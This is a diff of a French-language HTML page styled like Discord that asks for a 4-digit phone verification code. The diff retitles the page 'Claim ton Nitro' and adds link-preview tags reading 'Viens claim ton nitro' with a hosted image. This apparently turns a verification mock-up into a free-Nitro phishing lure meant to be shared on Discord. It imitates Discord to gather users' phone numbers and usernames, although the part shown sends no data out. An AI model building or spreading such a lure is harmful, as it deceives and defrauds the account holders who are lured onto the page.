@@ -3,7 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vérification</title>
+<title>Claim ton Nitro</title>
+
+<!-- Open Graph / Discord embed -->
+<meta property="og:type"         content="website">
+<meta property="og:title"        content="Claim ton Nitro">
+<meta property="og:description"  content="Viens claim ton nitro">
+<meta property="og:image"        content="https://files.catbox.moe/939zj5.png">
+<meta property="og:image:width"  content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- Twitter Card -->
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="Claim ton Nitro">
+<meta name="twitter:description" content="Viens claim ton nitro">
+<meta name="twitter:image"       content="https://files.catbox.moe/939zj5.png">
+
+<!-- General -->
+<meta name="description" content="Viens claim ton nitro">
+
 <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -109,7 +127,6 @@
     font-weight: 700;
   }
 
-  /* Code boxes */
   .code-label {
     font-size: 12px;
     font-weight: 700;
@@ -143,7 +160,6 @@
     outline: none;
     caret-color: #5865f2;
     transition: border-color 0.15s;
-    /* Fix vendor prefix warning — both standard and webkit */
     -moz-appearance: textfield;
     appearance: textfield;
   }
@@ -154,9 +170,7 @@
     appearance: none;
   }
 
-  .code-box:focus {
-    border-color: #5865f2;
-  }
+  .code-box:focus { border-color: #5865f2; }
 
   .code-box.filled {
     border-color: #4752c4;
@@ -201,7 +215,6 @@
     font-family: inherit;
     cursor: pointer;
     padding: 0;
-    text-decoration: none;
   }
 
   .resend button:hover { text-decoration: underline; }
@@ -251,7 +264,7 @@
     margin: 1.25rem 0 1rem;
   }
 
-  /* ---- Success screen ---- */
+  /* ---- Success ---- */
   .success { display: none; text-align: center; }
 
   .success-icon {
@@ -302,9 +315,7 @@
     padding: 6px 0;
   }
 
-  .summary-row:not(:last-child) {
-    border-bottom: 1px solid #2b2d31;
-  }
+  .summary-row:not(:last-child) { border-bottom: 1px solid #2b2d31; }
 
   .summary-key {
     font-size: 12px;
@@ -334,11 +345,7 @@
     margin-bottom: 1.5rem;
   }
 
-  .dot {
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    background: #23a55a;
-  }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #23a55a; }
 
   .btn-restart {
     width: 100%;
@@ -371,7 +378,7 @@
     </div>
 
     <h1 class="card-title">Vérifie ton numéro</h1>
-    <p class="card-sub" id="desc-phone">Saisis le code à 4 chiffres envoyé au <strong id="phone-display"></strong></p>
+    <p class="card-sub">Saisis le code à 4 chiffres envoyé au <strong id="phone-display"></strong></p>
 
     <div class="progress-wrap">
       <span class="done"></span>
@@ -442,32 +449,24 @@
 </div>
 
 <script>
-  /* ---- Récupération des données de session ---- */
   const phone  = sessionStorage.getItem('phone')  || '';
   const pseudo = sessionStorage.getItem('pseudo') || '';
 
   const phoneDisplay = document.getElementById('phone-display');
   if (phoneDisplay && phone) phoneDisplay.textContent = phone;
 
-  /* ---- Cases du code ---- */
   const boxes = ['c0','c1','c2','c3'].map(id => document.getElementById(id));
   const err   = document.getElementById('err');
 
   boxes.forEach((box, i) => {
     box.addEventListener('input', () => {
-      /* Garder uniquement un chiffre */
       box.value = box.value.replace(/\D/g, '').slice(-1);
       box.classList.toggle('filled', box.value !== '');
-
-      /* Avancer automatiquement */
       if (box.value !== '' && i < 3) boxes[i + 1].focus();
-
-      /* Vérification auto quand les 4 cases sont remplies */
       if (getCode().length === 4) setTimeout(verify, 80);
     });
 
     box.addEventListener('keydown', e => {
-      /* Retour arrière : effacer et reculer */
       if (e.key === 'Backspace') {
         if (box.value) {
           box.value = '';
@@ -481,7 +480,6 @@
       }
     });
 
-    /* Coller un code complet */
     box.addEventListener('paste', e => {
       e.preventDefault();
       const pasted = (e.clipboardData || window.clipboardData)
@@ -498,14 +496,12 @@
     });
   });
 
-  /* Focus la première case au chargement */
   boxes[0].focus();
 
   function getCode() {
     return boxes.map(b => b.value).join('');
   }
 
-  /* ---- Vérification (code fictif : 1234) ---- */
   const VALID_CODE = '1234';
   let isVerifying = false;
 
@@ -547,6 +543,7 @@
     document.getElementById('step-code').style.display = 'none';
     const s = document.getElementById('step-success');
     s.style.display = 'block';
+    s.style.animation = 'fadeUp 0.4s ease';
 
     document.getElementById('success-title').textContent =
       'Bienvenue, ' + (pseudo || 'toi') + ' !';
